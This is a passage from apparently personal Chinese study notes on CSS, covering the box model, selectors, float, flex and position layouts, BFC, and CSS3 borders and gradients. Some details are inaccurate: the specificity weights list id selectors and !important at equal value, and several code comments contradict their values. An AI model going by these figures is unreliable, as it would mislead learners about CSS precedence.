&#x2F;*已选中的链接*&#x2F;</span><br></pre></td></tr></table></figure><ul><li>伪元素选择器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::first-letter  &#x2F;&#x2F;第一个</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::first-line    &#x2F;&#x2F;第一行 只能用于块级元素</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::selection     &#x2F;&#x2F;选中</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::before        &#x2F;&#x2F;在开始位置</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::after         &#x2F;&#x2F;在结束位置</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217135530.png" alt="image-20211217135528860"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217135609.png" alt="image-20211217135608118"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217135647.png" alt="image-20211217135646421"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217135724.png" alt="image-20211217135723309"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217135857.png" alt="image-20211217135855719"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217135925.png" alt="image-20211217135920788"></p></li></ul><p><strong>CSS基本概念之盒⼦模型</strong></p><p>在CSS⾥⾯，所有的HTML元素你都可以看成是⼀个盒⼦</p><ul><li>盒⼦的内容(content)<ul><li>元素的大小</li></ul></li><li>盒⼦的内边距(padding)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">padding-left:10px   &#x2F;&#x2F;左边距10px</span><br><span class="line">padding-top:10px    &#x2F;&#x2F;上边距10px</span><br><span class="line">padding-right:10px  &#x2F;&#x2F;右边距10px</span><br><span class="line">padding-bottom:10px &#x2F;&#x2F;下边距10%，相对于父级元素的width</span><br><span class="line"></span><br><span class="line">padding:10px 10px 10px 10% &#x2F;&#x2F;等同于上面四行 百分比是对应父标签的大小</span><br><span class="line">padding:5px 10px    &#x2F;&#x2F;上下边距5px、左右边距10px</span><br><span class="line">padding:5px 10px 20px  &#x2F;&#x2F;上边距 左右边距 下边距</span><br><span class="line">padding:10px        &#x2F;&#x2F;上下左右边距10px</span><br></pre></td></tr></table></figure><ul><li>盒⼦的边框(border)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">border-left:3px solid #000  &#x2F;&#x2F;左边距10px dotted dashed</span><br><span class="line">border-top:3px solid #000 &#x2F;&#x2F;上边距10px</span><br><span class="line">border-right:3px solid #000 &#x2F;&#x2F;右边距10px</span><br><span class="line">border-bottom:3px solid #000  &#x2F;&#x2F;下边距10%，相对于父级元素的width</span><br><span class="line"></span><br><span class="line">border:3px solid #000 &#x2F;&#x2F;等同于上面四行</span><br></pre></td></tr></table></figure><ul><li><p>盒⼦的外边距(margin)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">margin-left:10px  &#x2F;&#x2F;左边距10px</span><br><span class="line">margin-top:10px   &#x2F;&#x2F;上边距10px</span><br><span class="line">margin-right:10px &#x2F;&#x2F;右边距10px</span><br><span class="line">margin-bottom:10% &#x2F;&#x2F;下边距10%，相对于父级元素的width</span><br><span class="line"></span><br><span class="line">margin:10px 10px 10px 10% &#x2F;&#x2F;等同于上面四行</span><br><span class="line">margin:5px 10px   &#x2F;&#x2F;上下边距5px、左右边距10px</span><br><span class="line">margin:10px       &#x2F;&#x2F;上下左右边距10px</span><br></pre></td></tr></table></figure></li><li><p>盒子怪异模型</p><ul><li><p>W3C标准的盒子模型（标准盒模型 )</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boxWidth&#x3D;contentWidth</span><br></pre></td></tr></table></figure></li><li><p>IE标准的盒子模型（怪异盒模型）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">box-sizing:border-box &#x2F;&#x2F;声明</span><br><span class="line">boxWidth&#x3D;contentWidth+border+padding</span><br></pre></td></tr></table></figure></li><li><p>外边距折叠</p><ul><li><p>上下两个兄弟盒子的margin都为正取大，都为负取小，一正一负相加</p></li><li><p>父子元素盒子的margin（假设没有内边距或边框把外边距分隔开），也会合并；</p><p>只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">解决父子边距合并：</span><br><span class="line">父元素&#123;</span><br><span class="line">  overflow:auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">父元素::before&#123;</span><br><span class="line">  display: table;</span><br><span class="line">  content: &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217130140.png" alt="image-20211217130138293"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217122311.png" alt="image-20211217122310155"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217123417.png" alt="image-20211217123415410"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217123628.png" alt="image-20211217123626568"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217123655.png" alt="image-20211217123653721"></p><p>顺时针</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217123744.png" alt="image-20211217123743470"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217124636.png" alt="image-20211217124635120"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217124545.png" alt="image-20211217124544131"></p><ul><li><p>常⽤属性</p><ul><li><p>盒⼦的位置和⼤⼩</p><ul><li><p>尺寸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">宽度 width: ⻓度|百分⽐|auto</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⾼度 height</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">边界 margin padding 上右下左|上下左右</span><br></pre></td></tr></table></figure></li><li><p>布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浮动：float</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定位：position</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">弹性布局：flex</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">盒⼦内容超出部分：overflow：hidden | scroll | auto</span><br></pre></td></tr></table></figure></li></ul></li><li><p>外观，⻛格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-image</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-repeat</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-size</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-position</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color</span><br></pre></td></tr></table></figure><ul><li><p>⽂字属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字体⼤⼩ font-size</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是否加粗 font-weight</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是不是斜体 font-style</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字体是什么 font-family</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217132157.png" alt="image-20211217132156124"></p><ul><li>CSS全称：层叠样式表(Cascading Style Sheets)</li><li>层叠是⼀个基本特征<ul><li>⼀个css属性被多次声明的时候，会根据优先级或者声明顺序来计算采⽤哪个样式</li></ul></li><li>优先级是怎么计算<ul><li>通配符选择器 1： *</li><li>标签选择器 2：div/span/p/li</li><li>类选择器 3：class</li><li>id选择器 6：id</li><li>行内样式 5</li><li>!important 6（尽量不要在公⽤代码⾥使⽤）</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217133321.png" alt="image-20211217133320114"></p><p><strong>CSS中常⻅的可继承的属性</strong></p><ul><li>什么是继承<ul><li>继承了⽗元素的某些属性</li><li>优点：继承可以简化代码，便于维护</li></ul></li><li>默认设置继承的属性<ul><li>⽂字属性，文本缩进、对齐、行高</li></ul></li></ul><p><strong>练习：第二个子元素鼠标悬浮时，字体为红色，背景颜色为绿色，即使子元素个数发生变化都满足</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217135134.png" alt="image-20211217135133499"></p><h1 id="CSS进阶之布局定位"><a href="#CSS进阶之布局定位" class="headerlink" title="CSS进阶之布局定位"></a>CSS进阶之布局定位</h1><h2 id="CSS中布局前置知识"><a href="#CSS中布局前置知识" class="headerlink" title="CSS中布局前置知识"></a>CSS中布局前置知识</h2><ul><li>正常元素怎么布局<ul><li>默认，⼀个块级元素的内容宽度就是其⽗元素的100%，他的⾼度和其内容⾼度⼀致</li><li>⾏内元素它的宽度和⾼度都是根据内容决定的(⽆法设置⾏内元素的宽⾼)<ul><li>可设置display属性，定义元素的类型(css3定义布局)</li></ul></li></ul></li><li>元素之间⼜是如何相互影响的呢<ul><li>正常的⽂档布局流<ul><li>每个块级元素会在上个元素下⾯另起⼀⾏</li><li>⾏内元素不会另起⼀⾏</li></ul></li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217142346.png" alt="image-20211217142345254"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217142328.png" alt="image-20211217142326896"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217142412.png" alt="image-20211217142411073"></p><h2 id="CSS中必须掌握的float布局"><a href="#CSS中必须掌握的float布局" class="headerlink" title="CSS中必须掌握的float布局"></a>CSS中必须掌握的float布局</h2><ul><li><p>float布局</p><ul><li><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">float: none;  &#x2F;&#x2F;默认值，元素不浮动</span><br><span class="line">float: left;  &#x2F;&#x2F;元素像左浮动</span><br><span class="line">float: right; &#x2F;&#x2F;元素像右浮动</span><br></pre></td></tr></table></figure></li><li><p>特点</p><ul><li>浮动元素会脱离文档流，不再占据文档流空间</li><li>浮动元素彼此之间是从左往右排列，宽度超过一行自动换行</li><li>在浮动元素前面元素不浮动时，浮动元素无法上移</li><li>块级元素和行内元素浮动之后都变成行内块级元素</li><li>浮动元素不会盖住文字，可以设置文字环绕效果</li></ul></li><li><p>清除浮动</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217150508.png" alt="image-20211217150215607"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clear:both;</span><br><span class="line">content:&#39;&#39;;</span><br><span class="line">display:block;</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217150256.png" alt="image-20211217150254474"></p></li></ul><h2 id="CSS中必须掌握的flex布局"><a href="#CSS中必须掌握的flex布局" class="headerlink" title="CSS中必须掌握的flex布局"></a>CSS中必须掌握的flex布局</h2><p>flex布局（弹性布局） CSS3知识点</p><ul><li>父元素容器的属性</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217142638.png" alt="image-20211217142632202"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 设为 Flex 布局以后，子元素的float、clear和vertical-align属性将失效。*&#x2F;</span><br><span class="line">display: flex;</span><br><span class="line"></span><br><span class="line">&#x2F;* 决定主轴的方向（即项目的排列方向）*&#x2F;</span><br><span class="line">flex-direction: row | row-reverse | column | column-reverse;</span><br><span class="line"></span><br><span class="line">&#x2F;* 是否换行 *&#x2F;</span><br><span class="line">flex-wrap: nowrap | wrap | wrap-reverse; </span><br><span class="line"></span><br><span class="line">&#x2F;* 定义水平方向对齐方式 *&#x2F;</span><br><span class="line">justify-content: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line"></span><br><span class="line">&#x2F;* 定义垂直方向对齐方式 *&#x2F;</span><br><span class="line">align-items: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line"></span><br><span class="line">&#x2F;* 定义多个轴线（多行&#x2F;多列）对齐方式 *&#x2F;</span><br><span class="line">align-content: flex-start | flex-end | center | space-between | space-around | stretch;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217151219.png" alt="image-20211217151218111"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217151339.png" alt="image-20211217151337499"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217160018.png" alt="image-20211217160017322"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217154945.png" alt="image-20211217154942556"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217155020.png" alt="image-20211217155018341"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217155104.png" alt="image-20211217155102617"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217155132.png" alt="image-20211217155130743"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217155236.png" alt="image-20211217155234288"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217155252.png" alt="image-20211217155250811"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217155340.png" alt="image-20211217155338834"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217155351.png" alt="image-20211217155350226"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217160046.png" alt="image-20211217155509167"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217160041.png" alt="image-20211217155622917"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217160434.png" alt="image-20211217160433366"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217160506.png" alt="image-20211217160503362"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217160549.png" alt="image-20211217160547545"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217160653.png" alt="image-20211217160652401"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217161315.png" alt="image-20211217161314498"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217161335.png" alt="image-20211217161327428"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217161430.png" alt="image-20211217161429493"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217161710.png" alt="image-20211217161640159"></p><ul><li>子元素容器的属性</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 定义子元素的排列顺序，默认为0 *&#x2F;</span><br><span class="line">order: -10 | -1 | 0 | 1 | 10;</span><br><span class="line"></span><br><span class="line">&#x2F;* 定义子元素的放大比例，默认为0 *&#x2F;</span><br><span class="line">flex-grow: 0 | 1 | 2 | 3;</span><br><span class="line"></span><br><span class="line">&#x2F;* 定义子元素的缩小比例，默认为1 *&#x2F;</span><br><span class="line">flex-shrink: 0 | 1;</span><br><span class="line"></span><br><span class="line">&#x2F;* 定义了在分配多余空间之前，项目占据的主轴空间 *&#x2F;</span><br><span class="line">flex-basis: &lt;length&gt; | auto;</span><br><span class="line"></span><br><span class="line">&#x2F;* flex-grow, flex-shrink 和 flex-basis的简写 *&#x2F;</span><br><span class="line">flex: 0 1 auto;</span><br></pre></td></tr></table></figure><ul><li>兼容性<ul><li>浏览器ie9及以上</li></ul></li><li>选择float布局 or flex布局？<ul><li>推荐是使用flex布局<ul><li>flex布局易用，布局全面</li><li>float的创建初衷只是为了达到文字环绕的效果，另外需要清除浮动</li><li>现在几乎所有公司的产品使用场景都在浏览器ie9以上</li></ul></li></ul></li></ul><h2 id="CSS中必须掌握的position定位"><a href="#CSS中必须掌握的position定位" class="headerlink" title="CSS中必须掌握的position定位"></a>CSS中必须掌握的position定位</h2><ul><li>也是为布局引⼊的属性</li><li>position常⽤的⼏个值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">position: static   (静态定位)   父元素</span><br><span class="line">position: relative (相对绝对)   父元素</span><br><span class="line">position: absolute (绝对定位)</span><br><span class="line"></span><br><span class="line">position: fixed    (固定定位)   父元素</span><br><span class="line">position: sticky   (粘性定位)   父元素</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217162735.png" alt="image-20211217162733897"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217162752.png" alt="image-20211217162751064"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217162949.png" alt="image-20211217162947293"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217163350.png" alt="image-20211217163348899"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217163510.png" alt="image-20211217163508405"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217211125.png" alt="image-20211217163648535"></p><p>position : sticky</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217163734.png" alt="image-20211217163733279"></p><p>相关的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z-index &#x2F;&#x2F;使⽤场景：当定位的盒⼦重叠在⼀起</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217163953.png" alt="image-20211217163952104"></p><h2 id="CSS之经典的三栏布局如何实现"><a href="#CSS之经典的三栏布局如何实现" class="headerlink" title="CSS之经典的三栏布局如何实现"></a>CSS之经典的三栏布局如何实现</h2><ul><li>问题：⾼度固定，左右两侧的盒⼦宽度为200px，中间⾃适应<ul><li>float</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217164439.png" alt="image-20211217164438224"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217164715.png" alt="image-20211217164713512"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217164849.png" alt="image-20211217164847623"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217164950.png" alt="image-20211217164948331"></p><ul><li><p>position</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217165137.png" alt="image-20211217165136190"></p><ul><li>flex</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217165859.png" alt="image-20211217165425406"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217165856.png" alt="image-20211217165854767"></p></li><li><p>解决</p><ul><li>float实现</li><li>position实现</li><li>flex实现</li></ul></li></ul><h2 id="CSS之⽔平垂直居中的常用方法"><a href="#CSS之⽔平垂直居中的常用方法" class="headerlink" title="CSS之⽔平垂直居中的常用方法"></a>CSS之⽔平垂直居中的常用方法</h2><p>如何使⽤CSS实现⽔平垂直居中</p><ul><li>⾏内块元素</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. line-height</span><br><span class="line">   text-align: center</span><br><span class="line">2. display: flex;</span><br><span class="line">   justify-content: center;</span><br><span class="line">   align-items: center;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217170120.png" alt="image-20211217170118726"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217170304.png" alt="image-20211217170303115"></p><ul><li>块级元素</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. position + margin    清楚子元素的宽高</span><br><span class="line">2. position + transform 不清楚子元素的宽高</span><br><span class="line">3. flex     </span><br><span class="line">4. table-cell           兼容性较差</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217170657.png" alt="image-20211217170656027"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217170822.png" alt="image-20211217170819755"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217171007.png" alt="image-20211217171005821"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217171132.png" alt="image-20211217171131025"></p><h2 id="CSS扩展⾼级知识点之BFC"><a href="#CSS扩展⾼级知识点之BFC" class="headerlink" title="CSS扩展⾼级知识点之BFC"></a>CSS扩展⾼级知识点之BFC</h2><ul><li><p>定义</p><ul><li><strong>块格式化上下⽂</strong>（Block Formatting Context，BFC）是Web⻚⾯的可视化CSS渲染的⼀部分，是块盒⼦的布局过程发⽣的区域，也是浮动元素与其他元素交互的区域。</li><li>即：形成了⼀块封闭的区域，能检测到区域内脱离⽂档流的元素</li></ul></li><li><p>特点</p><ul><li>css中隐含的属性，开启后不会被浮动的元素覆盖</li><li>BFC元素可以包含浮动元素</li><li>BFC元素的子元素和父元素外边距不重叠</li></ul></li><li><p>开启（都会有副作用）</p><ul><li><p>设置元素浮动 float：left</p></li><li><p>设置为行内块元素 display：inline-block</p></li><li><p>overflow：hidden（推荐）</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217181635.png" alt="image-20211217181633482"></p><p>发生重叠</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217182113.png" alt="image-20211217182111245"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217182149.png" alt="image-20211217182147563"></p></li></ul></li><li><p>作⽤</p><ul><li>清除浮动带来的影响</li><li>解决边距塌陷问题(外边距折叠（Margin collapsing）也只会发⽣在属于同⼀BFC的块级元素之间)</li></ul></li></ul><p><strong>实现小滴课堂的悬浮二维码与联系方式</strong></p><p>考察position: fixed定位</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217183150.png" alt="image-20211217183148654"></p><p>箭头的实现</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217183410.png" alt="image-20211217183409094"></p><h1 id="CSS3常用属性讲解"><a href="#CSS3常用属性讲解" class="headerlink" title="CSS3常用属性讲解"></a>CSS3常用属性讲解</h1><h2 id="CSS3边框"><a href="#CSS3边框" class="headerlink" title="CSS3边框"></a>CSS3边框</h2><ul><li><p>圆角</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">border-radius</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217183835.png" alt="image-20211217183819179"></p></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217183905.png" alt="image-20211217183904452"></p><ul><li><p>盒阴影</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">box-shadow</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217184125.png" alt="image-20211217184123925"></p><p>box-shadow 第一个值是指向左还是向右，如果为正数则向右，反之则向左，第二个值若为正数则向下，反之向上，第三个值是指虚化度越大越虚</p></li><li><p>边界图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">border-image</span><br></pre></td></tr></table></figure></li></ul><h2 id="CSS3渐变"><a href="#CSS3渐变" class="headerlink" title="CSS3渐变"></a>CSS3渐变</h2><ul><li><p>基本语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 从上到下（默认情况下）*&#x2F;</span><br><span class="line">background-image: linear-gradient(#e66465, #9198e5);</span><br><span class="line"></span><br><span class="line">&#x2F;* 从左到右 *&#x2F;</span><br><span class="line">background-image: linear-gradient(to right, red , yellow);</span><br><span class="line"></span><br><span class="line">&#x2F;* 对角 *&#x2F;</span><br><span class="line">background-image: linear-gradient(to bottom right, red, yellow);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217184542.png" alt="image-20211217184541236"></p></li><li><p>使用角度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 从上到下 *&#x2F;</span><br><span class="line">background-image: linear-gradient(180deg, red, yellow); </span><br><span class="line">&#x2F;* 从左到右 *&#x2F;</span><br><span class="line">background-image: linear-gradient(90deg, red, yellow);</span><br></pre></td></tr></table></figure></li><li><p>多个颜色</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 从上到下 *&#x2F;</span><br><span class="line">background-image: linear-gradient(red, yellow, green);</span><br><span class="line">&#x2F;* 从左到右 *&#x2F;</span><br><span class="line">background-image: linear-gradient(to right, red, orange, yellow);</span><br></pre></td></tr></table></figure></li><li><p>透明度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-image: linear-gradient(rgba(255,0,0,0), rgba(255,0,0,1));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217211402.png" alt="image-20211217184830932"></p></li><li><p>重复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 